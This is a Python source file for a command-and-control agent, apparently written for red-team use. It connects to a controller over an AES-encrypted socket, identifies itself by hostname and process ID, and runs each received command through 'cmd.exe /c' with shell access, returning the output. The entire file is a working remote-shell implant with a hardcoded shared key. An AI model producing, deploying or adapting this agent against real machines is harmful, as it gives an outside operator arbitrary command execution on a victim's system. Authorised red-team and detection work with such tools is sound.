import os
import socket
import subprocess
import threading
import time

from crypto_utils import decrypt_payload, derive_key, encrypt_payload
from transport import recv_frame, send_frame

HOST = "127.0.0.1"
PORT = 9999
SHARED_SECRET = b"RedTeamSecretKey12345!"
AES_KEY = derive_key(SHARED_SECRET)


class C2Agent:
    def __init__(self):
        self.agent_id = f"{socket.gethostname()}_{os.getpid()}"
        self.running = True
        print(f"[+] Agent Initialized. ID: {self.agent_id}")

    def connect_and_listen(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((HOST, PORT))

                hello = {"type": "hello", "payload": {"id": self.agent_id}}
                send_frame(client_socket, encrypt_payload(AES_KEY, hello))

                print("[+] Connected to Controller. Waiting for messages...")

                while self.running:
                    packet = recv_frame(client_socket)
                    if not packet:
                        break

                    try:
                        message = decrypt_payload(AES_KEY, packet)
                    except Exception as e:
                        print(f"[!] Decrypt error: {e}")
                        break

                    response = self.handle_message(message)
                    if response:
                        print(f"response : {response}")
                        send_frame(client_socket, encrypt_payload(AES_KEY, response))

        except Exception as e:
            print(f"[!] Connection error: {e}")

    def handle_message(self, message):
        print(message)
        msg_type = message.get("type")
        payload = message.get("payload", "")
        print(f"[agent] received {msg_type}: {payload}")

        #if msg_type == "msg":
        #    return {"type": "echo", "payload": payload}
        if msg_type == "msg":
        # ✅ Execute the command from the payload
            try:
                print("executing")
                result = subprocess.check_output(
                    f'cmd.exe /c "{payload}"', shell=True, stderr=subprocess.STDOUT, timeout=10)
                print(f"result : {result}")
                decoded = result.decode(errors="ignore")
                print(f"decoded : {decoded}")
                response = {
                    "type": "resp",
                    "status": "success",
                    "output": result.decode()
                }
            except Exception as e:
                print("exception")
                response = {
                    "type": "resp",
                    "status": "error",
                    "output": str(e)
                }
            return response
        if msg_type == "ping":
            return {"type": "pong", "payload": "alive"}

        return None


if __name__ == "__main__":
    try:
        agent = C2Agent()
        thread = threading.Thread(target=agent.connect_and_listen)
        thread.daemon = True
        thread.start()

        print("[+] Agent Listening. Press Ctrl+C to exit.")
        while agent.running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Agent Terminated...")
